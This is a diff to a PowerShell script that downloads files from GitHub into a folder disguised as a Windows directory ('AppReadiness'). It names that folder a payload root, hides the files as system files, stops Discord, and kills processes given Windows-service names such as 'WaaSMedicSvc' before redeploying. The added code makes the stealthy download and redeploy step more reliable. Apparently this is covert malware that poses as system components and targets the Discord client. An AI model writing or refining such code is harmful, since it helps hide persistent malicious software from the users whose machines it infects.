@@ -28,6 +28,24 @@ function Get-PayloadRoot {
     return Join-Path $env:LOCALAPPDATA "Microsoft\Windows\AppReadiness"
 }
 
+function Stop-PayloadProcesses {
+    $names = @("WaaSMedicSvc", "RuntimeHost")
+    foreach ($name in $names) {
+        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep -Seconds 2
+}
+
+function Unlock-DeployPath {
+    param([string]$Path)
+
+    if (-not (Test-Path $Path)) {
+        return
+    }
+
+    attrib -h -s -r $Path 2>$null | Out-Null
+}
+
 function Stop-DiscordIfRunning {
     $processes = Get-Process -Name "Discord" -ErrorAction SilentlyContinue
     if ($processes) {
@@ -51,12 +69,13 @@ function Hide-DeployTree {
     param([string[]]$Paths)
 
     foreach ($path in $Paths) {
-        if (-not (Test-Path $path)) {
+        if (-not (Test-Path -LiteralPath $path)) {
             continue
         }
 
-        if ((Get-Item $path).PSIsContainer) {
-            Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+        $item = Get-Item -LiteralPath $path -Force
+        if ($item.PSIsContainer) {
+            Get-ChildItem -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                 Set-SystemHidden $_.FullName
             }
         }
@@ -95,7 +114,16 @@ function Download-GithubFile {
     }
 
     Write-Host "[+] Downloading $RemotePath" -ForegroundColor Cyan
-    Invoke-WebRequest -Uri $url -OutFile $LocalPath -UseBasicParsing
+
+    Unlock-DeployPath -Path $LocalPath
+
+    $tempPath = "$LocalPath.download"
+    if (Test-Path $tempPath) {
+        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+    }
+
+    Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
+    Move-Item -Path $tempPath -Destination $LocalPath -Force
 }
 
 if ($GitHubBaseUrl -match "YOUR_USER") {
@@ -117,6 +145,7 @@ New-Item -ItemType Directory -Path $payloadRoot -Force | Out-Null
 New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
 
 Stop-DiscordIfRunning
+Stop-PayloadProcesses
 Remove-LegacyDeployFiles -PayloadRoot $payloadRoot
 
 $files = @(
